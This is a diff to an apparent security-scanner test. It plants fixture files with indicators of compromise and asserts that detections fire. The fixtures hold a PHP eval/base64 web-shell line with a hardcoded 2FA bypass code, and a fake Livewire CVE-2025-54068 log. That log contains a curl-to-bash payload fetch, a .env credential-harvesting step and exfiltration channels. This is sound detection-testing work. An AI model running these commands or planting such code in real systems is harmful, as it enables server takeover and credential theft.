@@ -346,10 +346,21 @@ function run() {
     "woocommerce-subscription class-wc-subscription-trace-dispatch"
   ].join("\n"));
   write(path.join(root, "var", "www", "app", "composer.lock"), JSON.stringify({
-    packages: [{
-      name: "dcat-auth-google-2fa",
-      version: "1.0.2.0",
-    }]
+    packages: [
+      {
+        name: "dcat-auth-google-2fa",
+        version: "1.0.2.0",
+      },
+      {
+        name: "livewire/livewire",
+        version: "v3.6.3",
+      }
+    ]
+  }, null, 2));
+  write(path.join(root, "var", "www", "app", "composer.json"), JSON.stringify({
+    require: {
+      "livewire/livewire": "^3"
+    }
   }, null, 2));
   write(path.join(root, "var", "www", "app", "vendor", "dcat-auth-google-2fa", "src", "Auth.php"), [
     "<?php",
@@ -357,6 +368,14 @@ function run() {
     "$bypass = '979890';",
     "$payload = eval(base64_decode($_POST['x'] ?? ''));",
     "// google 2FA dcat-auth-google-2fa"
+  ].join("\n"));
+  write(path.join(root, "var", "www", "app", "storage", "logs", "livewire-shoc.log"), [
+    "Imperva CVE-2025-54068 Laravel Livewire exploitation trace for livewire/livewire.",
+    "curl -skfsSL hxxps://xantibot[.]pw/database-sell/shoc.enz | tr -d '\\r' | bash >/dev/null 2>&1 &",
+    "shoc.enz sha256=548c3672fd3201dab56f714fdd5812bb024980815b3a2b6299f0126bdf16fb3e starts /tmp/xxxxx and shoc.sh.",
+    "find / -type f -name .env then harvest DB_HOST DB_DATABASE DB_USERNAME DB_PASSWORD APP_KEY.",
+    "Archive staging with zip and tar.gz before upload to FTP 47.129.100.149:21, api.telegram.org, upload.gofile.io, and webhook[.]site/b156c0b1-3e2f-41b4-a9a3-f492e50a0595.",
+    "Attribution notes mention Asia/Jakarta and @ashtarotz."
   ].join("\n"));
   write(path.join(root, "opt", "splunk", "etc", "splunk.version"), [
     "VERSION=10.0.1",
@@ -1085,6 +1104,13 @@ function run() {
   assert(ids.has("dcat-auth-google-2fa-hardcoded-bypass"));
   assert(ids.has("dcat-auth-google-2fa-obfuscated-php"));
   assert(ids.has("dcat-auth-google-2fa-composer-lock"));
+  assert(ids.has("livewire-cve-2025-54068-vulnerable-version"));
+  assert(ids.has("livewire-cve-2025-54068-version-range-review"));
+  assert(ids.has("livewire-cve-2025-54068-text-indicator"));
+  assert(ids.has("livewire-shoc-piped-curl-payload"));
+  assert(ids.has("livewire-env-credential-harvest"));
+  assert(ids.has("livewire-shoc-staging-and-archive"));
+  assert(ids.has("livewire-credential-exfil-channel"));
   assert(ids.has("vscode-autorun-blockchain-npm-version"));
   assert(ids.has("vscode-autorun-blockchain-c2-indicator"));
   assert(ids.has("vscode-autorun-blockchain-deaddrop-indicator"));
